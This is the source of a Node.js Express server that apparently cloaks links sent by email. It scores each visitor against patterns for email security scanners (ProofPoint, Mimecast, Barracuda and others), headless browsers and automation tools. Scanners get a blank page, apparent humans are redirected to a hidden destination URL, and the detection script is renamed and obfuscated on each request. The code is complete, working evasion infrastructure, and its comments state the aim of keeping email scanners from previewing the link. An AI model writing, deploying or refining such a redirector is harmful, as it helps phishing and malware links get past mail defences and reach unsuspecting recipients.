const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// CONFIGURATION - REDIRECT URL FROM ENV ONLY
// ============================================
const REDIRECT_URL = process.env.REDIRECT_URL;

if (!REDIRECT_URL) {
    console.error('❌ ERROR: REDIRECT_URL environment variable is not set!');
    console.error('Set it with: export REDIRECT_URL=https://your-destination.com');
    console.error('Or in Railway: Add REDIRECT_URL in Variables tab');
    process.exit(1);
}

// Rate limiting storage (in-memory, use Redis for production)
const rateLimitStore = new Map();
const fingerprintStore = new Map();

// Security headers to prevent email scanners from caching/previewing
app.use((req, res, next) => {
    // Prevent caching
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');

    // Additional security headers
    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');

    // Remove server header
    res.removeHeader('X-Powered-By');

    next();
});

// Parse JSON for API endpoints
app.use(express.json({ limit: '10kb' }));

// Advanced bot detection middleware
app.use((req, res, next) => {
    req.botScore = 0;
    req.botSignals = [];

    const userAgent = req.get('user-agent') || '';
    const acceptHeader = req.get('accept') || '';
    const acceptLanguage = req.get('accept-language') || '';
    const acceptEncoding = req.get('accept-encoding') || '';

    // 1. User-Agent Analysis (comprehensive patterns)
    const botPatterns = [
        // Email scanners
        /ProofPoint/i, /Mimecast/i, /Barracuda/i, /SafeRedirect/i,
        /EmailScanner/i, /MailScanner/i, /ATP/i, /Advanced.*Threat/i,
        /Link.*Scanner/i, /Security.*Scanner/i, /URL.*Scanner/i,
        /IronPort/i, /FortiMail/i, /Sophos/i,

        // Headless browsers
        /HeadlessChrome/i, /PhantomJS/i, /Nightmare/i,

        // Automation frameworks
        /Selenium/i, /WebDriver/i, /Puppeteer/i, /Playwright/i,
        /Cypress/i, /TestCafe/i, /ChromeDriver/i,

        // Common bots
        /bot/i, /crawl/i, /spider/i, /scrape/i,

        // HTTP libraries
        /curl/i, /wget/i, /python-requests/i, /python-urllib/i,
        /node-fetch/i, /axios/i, /okhttp/i, /Apache-HttpClient/i,
        /Java\//i, /Go-http-client/i, /libwww-perl/i,

        // Monitoring tools
        /monitor/i, /check/i, /validator/i, /preview/i,
        /uptime/i, /pingdom/i, /StatusCake/i
    ];

    const isBotUA = botPatterns.some(pattern => pattern.test(userAgent));

    if (isBotUA) {
        req.botScore += 60;  // Increased - strong signal
        req.botSignals.push('bot-ua');
    }

    // 2. Missing or suspicious headers
    if (!userAgent || userAgent.length < 10) {
        req.botScore += 30;
        req.botSignals.push('missing-ua');
    }

    if (!acceptHeader) {
        req.botScore += 25;
        req.botSignals.push('missing-accept');
    }

    if (!acceptLanguage) {
        req.botScore += 20;
        req.botSignals.push('missing-language');
    }

    if (!acceptEncoding) {
        req.botScore += 15;
        req.botSignals.push('missing-encoding');
    }

    // 3. Suspicious header combinations
    // Real browsers always send specific headers together
    const hasChrome = /Chrome/i.test(userAgent);
    const hasSafari = /Safari/i.test(userAgent);
    const hasFirefox = /Firefox/i.test(userAgent);

    if (hasChrome && !userAgent.includes('AppleWebKit')) {
        req.botScore += 25;
        req.botSignals.push('chrome-no-webkit');
    }

    if (hasSafari && !hasChrome && userAgent.includes('Chrome/')) {
        req.botScore += 25;
        req.botSignals.push('safari-inconsistent');
    }

    // 4. Suspicious accept header
    // Bots often have generic accept headers
    if (acceptHeader === '*/*' && !req.botSignals.includes('bot-ua')) {
        req.botScore += 15;
        req.botSignals.push('generic-accept');
    }

    // 5. HTTP version analysis
    const httpVersion = req.httpVersion;
    if (httpVersion === '1.0') {
        req.botScore += 20;
        req.botSignals.push('old-http-version');
    }

    // 6. TLS/Connection analysis
    const connection = req.get('connection');
    if (connection && connection.toLowerCase() === 'close') {
        req.botScore += 10;
        req.botSignals.push('connection-close');
    }

    // 7. Missing referer on direct access (suspicious for email scanners)
    const referer = req.get('referer') || req.get('referrer');
    if (!referer && req.path === '/') {
        req.botScore += 15;
        req.botSignals.push('no-referer');
    }

    // 8. Rate limiting by IP
    const clientIP = req.ip || req.connection.remoteAddress;
    const now = Date.now();
    const rateLimitWindow = 60000; // 1 minute
    const maxRequests = 10;

    if (!rateLimitStore.has(clientIP)) {
        rateLimitStore.set(clientIP, [now]);
    } else {
        const requests = rateLimitStore.get(clientIP).filter(time => now - time < rateLimitWindow);
        requests.push(now);
        rateLimitStore.set(clientIP, requests);

        if (requests.length > maxRequests) {
            req.botScore += 40;
            req.botSignals.push('rate-limit-exceeded');
        }
    }

    // Clean up old rate limit entries
    if (Math.random() < 0.01) {
        for (const [ip, requests] of rateLimitStore.entries()) {
            const validRequests = requests.filter(time => now - time < rateLimitWindow);
            if (validRequests.length === 0) {
                rateLimitStore.delete(ip);
            } else {
                rateLimitStore.set(ip, validRequests);
            }
        }
    }

    // 9. If score is very high, block immediately (server-side only)
    if (req.botScore >= 80) {
        console.log(`[BLOCKED] IP: ${clientIP}, UA: ${userAgent}, Score: ${req.botScore}, Signals: ${req.botSignals.join(', ')}`);
        return res.status(200).send('<!DOCTYPE html><html><head><title>Page</title><meta name="robots" content="noindex"></head><body></body></html>');
    }

    // Log suspicious requests
    if (req.botScore >= 40) {
        console.log(`[SUSPICIOUS] IP: ${clientIP}, UA: ${userAgent}, Score: ${req.botScore}, Signals: ${req.botSignals.join(', ')}`);
    }

    next();
});

// API endpoint to verify client-side bot detection
app.post('/api/verify-human', (req, res) => {
    const { fingerprint, behaviors, clientScore, checks, urlParams } = req.body;

    if (!fingerprint || !behaviors) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    // Combine server-side and client-side scores
    let totalScore = req.botScore || 0;
    const signals = [...(req.botSignals || [])];

    // Behavioral analysis - ONLY flag if COMBINED with other bot signals
    // Don't penalize for no interaction alone (accessibility, touch screens, etc.)
    const noInteraction = !behaviors.mouseMove && !behaviors.click && !behaviors.scroll && !behaviors.touch && !behaviors.keyboard;

    if (noInteraction && req.botScore > 20) {
        // Only add penalty if already suspicious from server-side checks
        totalScore += 30;
        signals.push('no-interaction-with-bot-signals');
    } else if (noInteraction) {
        // Just flag it, don't heavily penalize
        totalScore += 10;
        signals.push('no-interaction-only');
    }

    // Add client-side score (weighted)
    totalScore += (clientScore || 0) * 0.5;

    // Check for CDP detection (very strong signal)
    if (checks && checks.cdp) {
        totalScore += 60;  // CDP is extremely reliable
        signals.push('cdp-detected');
    }

    if (checks && checks.webdriver) {
        totalScore += 70;  // WebDriver flag is definitive
        signals.push('webdriver-detected');
    }

    // Automation artifacts (Selenium, Puppeteer, Playwright)
    if (checks && checks.automationArtifacts && checks.automationArtifacts.length > 0) {
        totalScore += 65;
        signals.push('automation-artifacts');
    }

    // Headless browser detection
    if (checks && checks.headlessSignals && checks.headlessSignals.length >= 2) {
        totalScore += 50;  // Multiple headless signals
        signals.push('headless-browser');
    }

    // Store fingerprint for analysis
    const clientIP = req.ip || req.connection.remoteAddress;
    const fpHash = crypto.createHash('md5').update(JSON.stringify(fingerprint)).digest('hex');

    if (fingerprintStore.has(fpHash)) {
        const stored = fingerprintStore.get(fpHash);
        stored.count++;
        stored.lastSeen = Date.now();

        // If same fingerprint from different IPs (suspicious)
        if (stored.ip !== clientIP) {
            totalScore += 20;
            signals.push('fingerprint-reuse');
        }
    } else {
        fingerprintStore.set(fpHash, {
            ip: clientIP,
            count: 1,
            firstSeen: Date.now(),
            lastSeen: Date.now()
        });
    }

    // Clean up old fingerprints
    if (Math.random() < 0.01) {
        const maxAge = 24 * 60 * 60 * 1000; // 24 hours
        const now = Date.now();
        for (const [hash, data] of fingerprintStore.entries()) {
            if (now - data.lastSeen > maxAge) {
                fingerprintStore.delete(hash);
            }
        }
    }

    // Decision - adjusted thresholds
    // Rely more on CDP detection, user-agent, and fingerprinting
    // Less on behavioral patterns alone
    const isBot = totalScore >= 80;
    const verdict = totalScore >= 100 ? 'bot' :
                    totalScore >= 80 ? 'likely-bot' :
                    totalScore >= 50 ? 'suspicious' :
                    'human';

    // Log decision
    console.log(`[VERIFICATION] IP: ${clientIP}, Verdict: ${verdict}, Score: ${totalScore}, Signals: ${signals.join(', ')}`);

    // Build final redirect URL with query params and path
    let finalRedirectUrl = null;
    if (!isBot && REDIRECT_URL) {
        try {
            const baseUrl = new URL(REDIRECT_URL);

            // Append path if provided
            if (urlParams && urlParams.path) {
                baseUrl.pathname = urlParams.path;
            }

            // Append query string if provided
            if (urlParams && urlParams.query) {
                baseUrl.search = urlParams.query;
            }

            finalRedirectUrl = baseUrl.toString();
        } catch (e) {
            // If URL parsing fails, use original
            finalRedirectUrl = REDIRECT_URL;
        }
    }

    res.json({
        allowed: !isBot,
        verdict: verdict,
        score: totalScore,
        signals: signals,
        redirectUrl: finalRedirectUrl
    });
});

// API endpoint for proof-of-work challenge
app.post('/api/challenge', (req, res) => {
    // Generate challenge
    const challenge = crypto.randomBytes(16).toString('hex');
    const difficulty = 4; // Number of leading zeros required

    res.json({
        challenge: challenge,
        difficulty: difficulty,
        timestamp: Date.now()
    });
});

// API endpoint to verify proof-of-work
app.post('/api/verify-pow', (req, res) => {
    const { challenge, nonce, timestamp } = req.body;

    if (!challenge || nonce === undefined || !timestamp) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    // Check timestamp (challenge should be recent)
    const now = Date.now();
    if (now - timestamp > 30000) {
        return res.json({ valid: false, reason: 'Challenge expired' });
    }

    // Verify proof of work
    const hash = crypto.createHash('sha256')
        .update(challenge + nonce)
        .digest('hex');

    const valid = hash.startsWith('0000'); // 4 leading zeros

    res.json({ valid: valid });
});

// Serve static files
app.use(express.static(path.join(__dirname)));

// Generate random filename for bot detection script
function generateRandomFilename() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

// Function to generate obfuscated JS with random identifiers
function generateObfuscatedJS() {
    const fs = require('fs');
    const template = fs.readFileSync(path.join(__dirname, 'au0cki7gbr.js'), 'utf8');

    // Generate random identifiers
    const randId = () => Math.random().toString(36).substring(2, 10);

    const mappings = {
        'AdvancedBotDetector': randId(),
        'detectCDP': randId(),
        'detectWebDriver': randId(),
        'detectHeadless': randId(),
        'checkNavigatorInconsistencies': randId(),
        'checkAutomationArtifacts': randId(),
        'generateFingerprint': randId(),
        'getCanvasFingerprint': randId(),
        'getWebGLFingerprint': randId(),
        'getAudioFingerprint': randId(),
        'getFontFingerprint': randId(),
        'getScreenFingerprint': randId(),
        'getBrowserFingerprint': randId(),
        'startBehaviorTracking': randId(),
        'waitForBehavior': randId(),
        'calculateScore': randId(),
        'simpleHash': randId(),
        'getResult': randId(),
        'checkPermissionsAsync': randId(),
        'cdpWeight': randId(),
        'behaviorWeight': randId(),
        'fingerprintWeight': randId(),
        'timingWeight': randId(),
        'navigatorWeight': randId(),
        'behaviorTimeout': randId(),
        'mouseMove': randId(),
        'startTime': randId(),
        'botScore': randId(),
        'botSignals': randId()
    };

    let obfuscated = template;

    // Replace all identifiers with random ones
    for (const [original, random] of Object.entries(mappings)) {
        const regex = new RegExp(`\\b${original}\\b`, 'g');
        obfuscated = obfuscated.replace(regex, random);
    }

    return obfuscated;
}

// HTML template function - generates page dynamically
function generateHTML(scriptName) {
    // Check if index.html exists, if so use it (for easier development)
    // Otherwise use embedded template
    const fs = require('fs');
    const htmlPath = path.join(__dirname, 'index.html');

    if (fs.existsSync(htmlPath)) {
        const htmlTemplate = fs.readFileSync(htmlPath, 'utf8');
        return htmlTemplate.replace(/src="au0cki7gbr\.js"/, `src="${scriptName}"`);
    }

    // Fallback: embedded HTML template (can remove index.html file)
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            height: 100vh; display: flex; justify-content: center; align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .container { text-align: center; color: white; padding: 2rem; max-width: 500px; }
        .spinner {
            width: 60px; height: 60px; border: 5px solid rgba(255,255,255,0.2);
            border-top: 5px solid white; border-radius: 50%;
            animation: spin 1s linear infinite; margin: 0 auto 1.5rem;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.75rem; font-weight: 600; margin-bottom: 0.5rem; }
        .message { margin-top: 1rem; font-size: 1rem; opacity: 0.9; }
        .progress { width: 100%; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin-top: 1.5rem; }
        .progress-bar { height: 100%; background: white; width: 0%; animation: progress 3s ease-in-out forwards; }
        @keyframes progress { 100% { width: 100%; } }
        #error { display: none; margin-top: 1.5rem; padding: 1rem; background: rgba(255,59,48,0.2); border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Redirecting...</h1>
        <p class="message">Please wait while we verify your connection</p>
        <div class="progress"><div class="progress-bar"></div></div>
        <div id="error"></div>
    </div>
    <script src="${scriptName}"></script>
    <script>
        (async function() {
            const detector = new AdvancedBotDetector({ behaviorTimeout: 3000, threshold: 80 });
            const result = await detector.detect();

            const urlParams = {
                path: window.location.pathname !== '/' ? window.location.pathname : null,
                query: window.location.search || null
            };

            const response = await fetch('/api/verify-human', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    fingerprint: result.fingerprint,
                    behaviors: result.behaviors,
                    clientScore: result.score,
                    checks: result.checks,
                    urlParams: urlParams
                })
            });

            const serverResult = await response.json();

            if (serverResult.allowed && serverResult.redirectUrl) {
                setTimeout(() => window.location.href = serverResult.redirectUrl, 2000);
            } else {
                document.querySelector('.spinner').style.display = 'none';
                document.querySelector('h1').textContent = 'Access Denied';
                document.querySelector('.message').textContent = 'Unable to verify your browser';
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').textContent = 'Your request appears automated.';
            }
        })();
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0;url=about:blank">
        <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;">
            <h1>JavaScript Required</h1>
        </div>
    </noscript>
</body>
</html>`;
}

// Main route
app.get('/', (req, res) => {
    // Generate random script name for this request
    const randomScriptName = generateRandomFilename() + '.js';

    // Generate HTML with random script name
    const html = generateHTML(randomScriptName);

    // Pass server-side bot score to client
    const initialScore = req.botScore || 0;
    res.cookie('_ss', initialScore, { httpOnly: false, maxAge: 60000 });
    res.send(html);
});

// Serve dynamically obfuscated bot detection script
app.get('/:randomname.js', (req, res) => {
    const obfuscatedJS = generateObfuscatedJS();
    res.setHeader('Content-Type', 'application/javascript');
    res.send(obfuscatedJS);
});

// Health check endpoint for Railway
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body><h1>404 - Not Found</h1></body></html>');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});
